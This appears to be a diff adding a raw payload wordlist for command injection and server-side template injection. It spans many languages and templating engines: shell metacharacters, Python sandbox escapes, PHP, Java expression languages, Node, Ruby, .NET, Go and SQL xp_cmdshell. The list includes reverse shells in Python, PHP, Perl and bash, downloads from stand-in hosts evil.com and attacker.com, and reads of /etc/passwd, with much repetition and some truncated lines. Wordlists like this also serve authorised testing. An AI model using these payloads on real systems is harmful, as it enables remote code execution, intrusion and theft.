@@ -1,0 +1,524 @@
+;id
+|id
+||id
+;id
+whoami
+;whoami;
+__import__('os').system('id')
+eval("__import__('os').system('id')")
+exec("__import__('os').system('id')")
+compile("__import__('os').system('id')",'','single')
+__builtins__.__dict__['__import__']('os').system('id')
+__import__('importlib').import_module('os').system('id')
+__import__('subprocess').getoutput('id')
+__import__('ctypes').CDLL(None).system('id')
+__import__('os').popen('id').read()
+__import__('subprocess').check_output('id',shell=True)
+[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys']>
+''.__class__.__mro__[1].__subclasses__()[408]('id').read()
+getattr(__import__('os'),'system')('id')
+locals()['__builtins__']['__import__']('os').system('id')
+globals()['__builtins__'].__dict__['__import__']('os').system('id')
+().__class__.__bases__[0].__subclasses__()[40]('id').read()
+().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['l>
+().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.va>
+request.application.__globals__.__builtins__.__import__('os').system('i>
+config.__class__.__init__.__globals__['os'].system('id')
+{{__import__('os').system('id')}}
+{{config.__class__.__init__.__globals__['os'].system('id')}}
+{{''.__class__.__mro__[1].__subclasses__()[408]('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').system(>
+{${exec('id')}}
+{${system('id')}}
+{${eval('system("id")')}}
+{${phpinfo()}}
+{${print_r(scandir('.'))}}
+${system('id')}
+${exec('id')}
+${eval('system("id")')}
+${`id`}
+${passthru('id')}
+${shell_exec('id')}
+${system('id')}
+${exec('id')}
+<?php system('id'); ?>
+<?php exec('id'); ?>
+<?php passthru('id'); ?>
+<?php shell_exec('id'); ?>
+<?php `id`; ?>
+<?php eval("system('id')"); ?>
+<?php assert("system('id')"); ?>
+<?php create_function('','system("id");')(); ?>
+<?php forward_static_call_array('system',array('id')); ?>
+<?php array_map('assert',array('system("id")')); ?>
+<?php preg_replace('/.*/e','system("id")',''); ?>
+<?php extract(array('x'=>'system')); $x('id'); ?>
+`id`
+$(id)
+{id,}
+id;id
+id&&id
+id||id
+id|id
+`id`;id
+$(id);id
+{id,};id
+id%0aid
+id%0did
+id%26%26id
+id%7cid
+id%3bid
+id%26id
+
+{id,}
+id;id
+id&&id
+id||id
+id|id
+`id`;id
+$(id);id
+{id,};id
+id%0aid
+id%0did
+id%26%26id
+id%7cid
+id%3bid
+id%26id
+id%7c%7cid
+id%60id%60
+id%24%28id%29
+id%7bid%2cid%7d
+Runtime.getRuntime().exec('id')
+new ProcessBuilder('id').start()
+Runtime.getRuntime().exec(new String[]{'id'})
+Class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null)>
+this.getClass().forName('java.lang.Runtime').getMethod('getRuntime').in>
+${T(java.lang.Runtime).getRuntime().exec('id')}
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRun>
+@java.lang.Runtime@getRuntime().exec('id')
+${@java.lang.Runtime@getRuntime().exec('id')}
+#{new ProcessBuilder('id').start()}
+${new ProcessBuilder('id').start()}
+require('child_process').execSync('id')
+process.mainModule.require('child_process').execSync('id')
+eval("require('child_process').execSync('id')")
+
+&id
+&&id
+`id`
+$(id)
+{{id}}
+{{config}}
+{{7*7}}
+{{7*'7'}}
+<%= 7*7 %>
+<?php system('id'); ?>
+<? system('id'); ?>
+<? exec('id'); ?>
+<? passthru('id'); ?>
+<? shell_exec('id'); ?>
+`whoami`
+$(whoami)
+{{''.__class__}}
+{{[].__class__}}
+{{request.__class__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+;whoami
+|whoami
+||whoami
+&whoami
+&&whoami
+`whoami`
+$(whoami)
+{{''.__class__.__mro__[1].__subclasses__()[408]}}
+;ls
+|ls
+||ls
+&ls
+&&ls
+`ls`
+$(ls)
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+;cat /etc/passwd
+|cat /etc/passwd
+||cat /etc/passwd
+&cat /etc/passwd
+&&cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+{{''.__class__.__mro__[1].__subclasses__()[408]('/etc/passwd').read()}}
+;uname -a
+|uname -a
+||uname -a
+&uname -a
+&&uname -a
+`uname -a`
+$(uname -a)
+{{''.__class__.__mro__[1].__subclasses__()[408]('uname -a').read()}}
+;ping -c 1 127.0.0.1
+|ping -c 1 127.0.0.1
+||ping -c 1 127.0.0.1
+&ping -c 1 127.0.0.1
+&&ping -c 1 127.0.0.1
+`ping -c 1 127.0.0.1`
+$(ping -c 1 127.0.0.1)
+{{''.__class__.__mro__[1].__subclasses__()[408]('ping -c 1 127.0.0.1').read()}}
+;wget http://evil.com/shell.txt
+|wget http://evil.com/shell.txt
+||wget http://evil.com/shell.txt
+&wget http://evil.com/shell.txt
+&&wget http://evil.com/shell.txt
+`wget http://evil.com/shell.txt`
+$(wget http://evil.com/shell.txt)
+{{''.__class__.__mro__[1].__subclasses__()[408]('wget http://evil.com/shell.txt').read()}}
+;curl http://evil.com/shell.txt
+|curl http://evil.com/shell.txt
+||curl http://evil.com/shell.txt
+&curl http://evil.com/shell.txt
+&&curl http://evil.com/shell.txt
+`curl http://evil.com/shell.txt`
+$(curl http://evil.com/shell.txt)
+{{''.__class__.__mro__[1].__subclasses__()[408]('curl http://evil.com/shell.txt').read()}}
+;nc -lvp 4444
+|nc -lvp 4444
+||nc -lvp 4444
+&nc -lvp 4444
+&&nc -lvp 4444
+`nc -lvp 4444`
+$(nc -lvp 4444)
+{{''.__class__.__mro__[1].__subclasses__()[408]('nc -lvp 4444').read()}}
+;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+||python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+&python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+&&python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')
+{{''.__class__.__mro__[1].__subclasses__()[408]('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])"').read()}}
+;php -r '$sock=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+|php -r '$sock=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+||php -r '$sock=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+&php -r '$sock=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+&&php -r '$sock=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+`php -r '$sock=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
+$(php -r '$sock=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");')
+{{''.__class__.__mro__[1].__subclasses__()[408]('php -r \"$sock=fsockopen(\\\"127.0.0.1\\\",4444);exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");\"').read()}}
+;perl -e 'use Socket;$i="127.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+|perl -e 'use Socket;$i="127.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+||perl -e 'use Socket;$i="127.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+&perl -e 'use Socket;$i="127.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+&&perl -e 'use Socket;$i="127.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+`perl -e 'use Socket;$i="127.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+$(perl -e 'use Socket;$i="127.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};')
+{{config.__class__.__init__.__globals__['os'].system('id')}}
+{{''.__class__.__mro__[1].__subclasses__()[408]('perl -e \"use Socket;$i=\\\"127.0.0.1\\\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};\"').read()}}
+{${exec('id')}}
+{${system('id')}}
+{${eval('system("id")')}}
+{${phpinfo()}}
+{${print_r(scandir('.'))}}
+;echo 'test' > /tmp/test.txt
+|echo 'test' > /tmp/test.txt
+`echo 'test' > /tmp/test.txt`
+$(echo 'test' > /tmp/test.txt)
+{{''.__class__.__mro__[1].__subclasses__()[408]('touch /tmp/pwned').read()}}
+;wget -O /tmp/pwn.sh http://attacker.com/pwn.sh
+|wget -O /tmp/pwn.sh http://attacker.com/pwn.sh
+`wget -O /tmp/pwn.sh http://attacker.com/pwn.sh`
+$(wget -O /tmp/pwn.sh http://attacker.com/pwn.sh)
+;curl -o /tmp/pwn.sh http://attacker.com/pwn.sh
+|curl -o /tmp/pwn.sh http://attacker.com/pwn.sh
+`curl -o /tmp/pwn.sh http://attacker.com/pwn.sh`
+$(curl -o /tmp/pwn.sh http://attacker.com/pwn.sh)
+{{''.__class__.__mro__[1].__subclasses__()[408]('wget http://attacker.com/pwn.sh -O /tmp/pwn.sh').read()}}
+;bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+|bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+`bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`
+$(bash -i >& /dev/tcp/127.0.0.1/4444 0>&1)
+;sh -i >& /dev/tcp/127.0.0.1/4444 0>&1
+|sh -i >& /dev/tcp/127.0.0.1/4444 0>&1
+`sh -i >& /dev/tcp/127.0.0.1/4444 0>&1`
+$(sh -i >& /dev/tcp/127.0.0.1/4444 0>&1)
+{{''.__class__.__mro__[1].__subclasses__()[408]('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"').read()}}
+;python3 -c 'import os; os.system("id")'
+|python3 -c 'import os; os.system("id")'
+`python3 -c 'import os; os.system("id")'`
+$(python3 -c 'import os; os.system("id")')
+<?php system('id'); ?>
+<?php exec('whoami'); ?>
+${system('id')}
+{${exec('whoami')}}
+passthru('id')
+shell_exec('whoami')
+`id`
+;id
+|id
+&&id
+
+__import__('os').system('id')
+eval("__import__('os').system('id')")
+{{__import__('os').system('id')}}
+{{config.__class__.__init__.__globals__['os'].system('id')}}
+{{''.__class__.__mro__[1].__subclasses__()[408]('id').read()}}
+[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('id')
+exec("import os; os.system('id')")
+subprocess.check_output('id', shell=True)
+os.popen('id').read()
+__import__('subprocess').getoutput('id')
+
+require('child_process').execSync('id')
+process.mainModule.require('child_process').execSync('id')
+eval("require('child_process').execSync('id')")
+global.process.mainModule.constructor._load('child_process').execSync('id')
+Function("return process.mainModule.require('child_process').execSync('id')")()
+${require('child_process').execSync('id')}
+{{require('child_process').execSync('id')}}
+[`require`('child_process').execSync('id')]
+console.log(require('child_process').execSync('id'))
+setTimeout(function(){require('child_process').execSync('id')},100)
+
+Runtime.getRuntime().exec('id')
+new ProcessBuilder('id').start()
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+@java.lang.Runtime@getRuntime().exec('id')
+Runtime.getRuntime().exec(new String[]{'id'})
+Process p = Runtime.getRuntime().exec('id')
+System.getProperty('os.name')
+
+`id`
+%x{id}
+Kernel.system('id')
+IO.popen('id')
+exec('id')
+system('id')
+open('| id')
+Process.spawn('id')
+eval("system('id')")
+Kernel.exec('id')
+
+System.Diagnostics.Process.Start('cmd.exe','/c whoami')
+<% System.Diagnostics.Process.Start("whoami") %>
+@{ System.Diagnostics.Process.Start("whoami") }
+${{ System.Diagnostics.Process.Start("whoami") }}
+Response.Write(System.Diagnostics.Process.Start("whoami"))
+<script runat=server>System.Diagnostics.Process.Start("whoami")</script>
+Server.CreateObject("WScript.Shell").Exec("whoami")
+Server.Execute("whoami")
+Dim shell: Set shell = CreateObject("WScript.Shell"): shell.Run "whoami"
+Process.Start("powershell.exe","whoami")
+
+system('id')
+`id`
+exec('id')
+readpipe('id')
+qx/id/
+open(FH,'id |')
+Kernel::system('id')
+IPC::Open3::open3('id')
+eval("system('id')")
+POSIX::system('id')
+
+os/exec.Command('id').Output()
+exec.Command('sh','-c','id').Output()
+syscall.Exec('/bin/sh',[]string{'sh','-c','id'},os.Environ())
+func(){exec.Command('id').Run()}()
+import."os/exec";Command('id').Run()
+os.StartProcess('/bin/sh',[]string{'sh','-c','id'},&os.ProcAttr{})
+exec.Command('bash','-c','id').CombinedOutput()
+cmd:=exec.Command('id');cmd.Run()
+os.system('id')
+runtime.GOOS
+
+;id
+|id
+||id
+&id
+&&id
+`id`
+$(id)
+{id,}
+id;id
+id&&whoami
+
+
+'; EXEC xp_cmdshell 'whoami'--
+'; SELECT sys_exec('whoami')--
+'; SELECT system('whoami')--
+'; \! whoami
+'; \! id
+UNION SELECT 1,2,3,4,5,6,7,8,9,load_file('/etc/passwd')
+'; COPY (SELECT '') TO PROGRAM 'whoami'--
+'; DECLARE @cmd VARCHAR(255); SET @cmd = 'whoami'; EXEC master..xp_cmdshell @cmd--
+`id` (in MySQL context)
+'; SHOW VARIABLES LIKE 'version%'
+__import__('os').system('id')
+eval("__import__('os').system('id')")
+exec("__import__('os').system('id')")
+compile("__import__('os').system('id')",'','single')
+__builtins__.__dict__['__import__']('os').system('id')
+__import__('importlib').import_module('os').system('id')
+__import__('subprocess').getoutput('id')
+__import__('ctypes').CDLL(None).system('id')
+__import__('os').popen('id').read()
+__import__('subprocess').check_output('id',shell=True)
+[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('id')
+''.__class__.__mro__[1].__subclasses__()[408]('id').read()
+getattr(__import__('os'),'system')('id')
+locals()['__builtins__']['__import__']('os').system('id')
+globals()['__builtins__'].__dict__['__import__']('os').system('id')
+().__class__.__bases__[0].__subclasses__()[40]('id').read()
+().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].system('id')
+().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").system("id")')
+request.application.__globals__.__builtins__.__import__('os').system('id')
+config.__class__.__init__.__globals__['os'].system('id')
+{{__import__('os').system('id')}}
+{{config.__class__.__init__.__globals__['os'].system('id')}}
+{{''.__class__.__mro__[1].__subclasses__()[408]('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').system('id')}}
+{${exec('id')}}
+{${system('id')}}
+{${eval('system("id")')}}
+{${phpinfo()}}
+{${print_r(scandir('.'))}}
+${system('id')}
+${exec('id')}
+${eval('system("id")')}
+${`id`}
+${passthru('id')}
+${shell_exec('id')}
+${system('id')}
+${exec('id')}
+<?php system('id'); ?>
+<?php exec('id'); ?>
+<?php passthru('id'); ?>
+<?php shell_exec('id'); ?>
+<?php `id`; ?>
+<?php eval("system('id')"); ?>
+<?php assert("system('id')"); ?>
+<?php create_function('','system("id");')(); ?>
+<?php forward_static_call_array('system',array('id')); ?>
+<?php array_map('assert',array('system("id")')); ?>
+<?php preg_replace('/.*/e','system("id")',''); ?>
+<?php extract(array('x'=>'system')); $x('id'); ?>
+`id`
+$(id)
+{id,}
+id;id
+id&&id
+id||id
+id|id
+`id`;id
+$(id);id
+{id,};id
+id%0aid
+id%0did
+id%26%26id
+id%7cid
+id%3bid
+id%26id
+id%7c%7cid
+id%60id%60
+id%24%28id%29
+id%7bid%2cid%7d
+Runtime.getRuntime().exec('id')
+new ProcessBuilder('id').start()
+Runtime.getRuntime().exec(new String[]{'id'})
+Class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')
+this.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')
+${T(java.lang.Runtime).getRuntime().exec('id')}
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+@java.lang.Runtime@getRuntime().exec('id')
+${@java.lang.Runtime@getRuntime().exec('id')}
+#{new ProcessBuilder('id').start()}
+${new ProcessBuilder('id').start()}
+require('child_process').execSync('id')
+process.mainModule.require('child_process').execSync('id')
+eval("require('child_process').execSync('id')")
+global.process.mainModule.constructor._load('child_process').execSync('id')
+Function("return process.mainModule.require('child_process').execSync('id')")()
+[`require`('child_process').execSync('id')]
+setTimeout(function(){require('child_process').execSync('id')},100)
+setImmediate(function(){require('child_process').execSync('id')})
+Promise.resolve().then(function(){require('child_process').execSync('id')})
+Buffer.from('id').toString()
+require('vm').runInNewContext('this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")')
+new Function('return process.mainModule.require("child_process").execSync("id")')()
+Proxy.apply({},{get:function(){return require('child_process').execSync('id')}})
+Reflect.apply(require('child_process').execSync,null,['id'])
+`id`
+%x{id}
+Kernel.system('id')
+IO.popen('id')
+exec('id')
+system('id')
+open('| id')
+Process.spawn('id')
+eval("system('id')")
+Kernel.exec('id')
+Kernel.`('id')
+Kernel.send('system','id')
+Object.send('system','id')
+Module.const_get('Kernel').send('system','id')
+Object.const_get('IO').popen('id','r'){|f|f.read}
+Object.instance_eval('system "id"')
+BasicObject.send(:eval,'system "id"')
+Kernel.instance_eval('system "id"')
+Method.new(method(:system)).call('id')
+Proc.new{system 'id'}.call
+lambda{system 'id'}.call
+->{system 'id'}.()
+Array.method(:system).call('id')
+Hash.method(:system).call('id')
+String.method(:system).call('id')
+Integer.method(:system).call('id')
+Float.method(:system).call('id')
+Symbol.method(:system).call('id')
+Time.method(:system).call('id')
+Date.method(:system).call('id')
+DateTime.method(:system).call('id')
+File.method(:system).call('id')
+Dir.method(:system).call('id')
+Regexp.method(:system).call('id')
+Range.method(:system).call('id')
+Struct.method(:system).call('id')
+Class.method(:system).call('id')
+Module.method(:system).call('id')
+Object.method(:system).call('id')
+BasicObject.method(:system).call('id')
+Kernel.method(:system).call('id')
+self.method(:system).call('id')
+method(:system).call('id')
+public_send('system','id')
+send('system','id')
+__send__('system','id')
+instance_eval('system "id"')
+instance_exec('id'){|c|system c}
+class_eval('system "id"')
+module_eval('system "id"')
+eval('system "id"')
+Binding.new.eval('system "id"')
+TOPLEVEL_BINDING.eval('system "id"')
+Object.const_set('X','id'); system X
+Object.const_get(:Kernel).system('id')
+Module.const_get(:Kernel).system('id')
+Class.const_get(:Kernel).system('id')
+BasicObject.const_get(:Kernel).system('id')
+self.class.const_get(:Kernel).system('id')
+Kernel.const_get(:Kernel).system('id')
+Object.const_get(:IO).popen('id','r'){|f|f.read}
+Module.const_get(:IO).popen('id','r'){|f|f.read}
+Class.const_get(:IO).popen('id','r'){|f|f.read}
+BasicObject.const_get(:IO).popen('id','r'){|f|f.read}
+self.class.const_get(:IO).popen('id','r'){|f|f.read}
+Kernel.const_get(:IO).popen('id','r'){|f|f.read}
+Object.const_get(:Process).spawn('id')
+Module.const_get(:Process).spawn('id')
+Class.const_get(:Process).spawn('id')
+BasicObject.const_get(:Process).spawn('id')
+self.class.const_get(:Process).spawn('id')
+Kernel.const_get(:Process).spawn('id')
+
